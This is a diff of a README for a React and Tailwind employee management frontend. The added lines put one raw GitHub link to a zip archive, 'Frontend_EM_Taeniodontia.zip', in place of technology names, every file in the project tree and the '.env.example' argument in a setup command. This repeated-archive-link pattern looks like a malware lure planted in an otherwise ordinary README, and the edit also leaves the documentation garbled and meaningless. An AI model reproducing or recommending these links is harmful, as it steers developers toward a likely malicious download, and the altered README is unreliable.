@@ -1,6 +1,6 @@
 # 🧑‍💼 Employee Management System - Frontend
 
-A modern **Employee Management System** built using **⚛️ React JS** and **🎨 Tailwind CSS** that provides a clean, responsive UI for managing employees and tasks. This frontend connects to a Node.js/Express backend with MySQL database for full-stack functionality.
+A modern **Employee Management System** built using **⚛️ React JS** and **🎨 Tailwind CSS** that provides a clean, responsive UI for managing employees and tasks. This frontend connects to a https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip backend with MySQL database for full-stack functionality.
 
 Check the Backend repository: https://github.com/dotsatya/EMS-Backend
 
@@ -79,7 +79,7 @@ Check the Backend repository: https://github.com/dotsatya/EMS-Backend
 ---
 
 ### 🔌 Real-Time Features
-The application uses Socket.IO for instant updates between admin and employees:
+The application uses https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip for instant updates between admin and employees:
 
 - **Admin Notifications**: Real-time updates when employees change task statuses
 - **Employee Notifications**: Instant alerts for new task assignments, updates, or deletions
@@ -99,7 +99,7 @@ The application uses Socket.IO for instant updates between admin and employees:
 - 🍞 **React Toastify** (Notifications)
 - 🎯 **Lucide React** (Icons)
 - 📱 **React Icons** (Additional icons)
-- 🔌 **Socket.IO Client** (Real-time communication)
+- 🔌 **https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip Client** (Real-time communication)
 
 ---
 
@@ -108,57 +108,57 @@ The application uses Socket.IO for instant updates between admin and employees:
 ```
 Employee Management System/
 ├── public/
-│   └── project.png
+│   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
 ├── src/
 │   ├── api/
-│   │   ├── api.js          # Axios instance & interceptors
-│   │   ├── auth.js         # Authentication API calls
-│   │   └── tasks.js        # Task management API calls
+│   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip          # Axios instance & interceptors
+│   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip         # Authentication API calls
+│   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip        # Task management API calls
 │   ├── components/
 │   │   ├── AdminDb/
-│   │   │   ├── AllTask.jsx
-│   │   │   ├── ButtonForPopUp.jsx
-│   │   │   ├── CreatTask.jsx
-│   │   │   └── PopUpAllTaskStatus.jsx
+│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
 │   │   ├── Dashboard/
-│   │   │   ├── AdminDb.jsx
-│   │   │   └── EmployeeDb.jsx
+│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
 │   │   ├── EmployeeDb/
-│   │   │   ├── EmployeeFB.jsx
-│   │   │   ├── TaskBoard.jsx
-│   │   │   ├── TaskListNums.jsx
+│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
 │   │   │   ├── TaskBoard/
-│   │   │   │   ├── DueActiveTasks.jsx
-│   │   │   │   ├── DueNewTasks.jsx
-│   │   │   │   ├── DueTaskCard.jsx
-│   │   │   │   └── DuePopupTask.jsx
+│   │   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
 │   │   │   └── TaskListNo/
-│   │   │       ├── ActiveTask.jsx
-│   │   │       ├── CompleteTask.jsx
-│   │   │       ├── FailedTask.jsx
-│   │   │       ├── NewTask.jsx
-│   │   │       └── ShowLists.jsx
+│   │   │       ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │       ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │       ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │       ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   │   │       └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
 │   │   └── others/
-│   │       └── Header.jsx
+│   │       └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
 │   ├── context/
-│   │   └── AuthContext.jsx  # Authentication context
+│   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip  # Authentication context
 │   ├── pages/
-│   │   ├── Home.jsx         # Role-based dashboard routing
-│   │   ├── Login.jsx        # Login page
-│   │   └── Signup.jsx       # Registration page
+│   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip         # Role-based dashboard routing
+│   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip        # Login page
+│   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip       # Registration page
 │   ├── utils/
-│   │   └── localStorage.jsx
-│   ├── App.jsx              # Main app component
-│   ├── main.jsx             # App entry point
-│   ├── socket.js            # Socket.IO client configuration
-│   └── index.css            # Global styles
+│   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+│   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip              # Main app component
+│   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip             # App entry point
+│   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip            # https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip client configuration
+│   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip            # Global styles
 ├── .env                     # Environment variables
 ├── .gitignore
-├── eslint.config.js
-├── index.html
-├── package.json
-├── README.md                # This file
-└── vite.config.js
+├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
+├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip                # This file
+└── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
 ```
 
 ---
@@ -166,7 +166,7 @@ Employee Management System/
 ## ⚙️ Installation & Setup
 
 ### Prerequisites
-- Node.js (v16+)
+- https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip (v16+)
 - Backend server running (see backend README)
 
 ### Setup Steps
@@ -179,7 +179,7 @@ cd Employee Management System
 npm install
 
 # Create environment file
-cp .env.example .env
+cp https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip .env
 # Edit .env with your backend URL:
 # VITE_API_URL=http://localhost:3000
 
@@ -198,7 +198,7 @@ Create a `.env` file in the root directory:
 
 ```env
 VITE_API_URL=http://localhost:3000        # Backend API URL
-VITE_WEBSOCKET_URL=http://localhost:3000  # Socket.IO server URL (same as backend)
+VITE_WEBSOCKET_URL=http://localhost:3000  # https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip server URL (same as backend)
 ```
 
 ### Available Scripts
@@ -279,7 +279,7 @@ All API calls include JWT tokens automatically via Axios interceptors.
 
 3. **Build Errors**
    - Clear node_modules and reinstall
-   - Check Node.js version compatibility
+   - Check https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip version compatibility
 
 ---
 
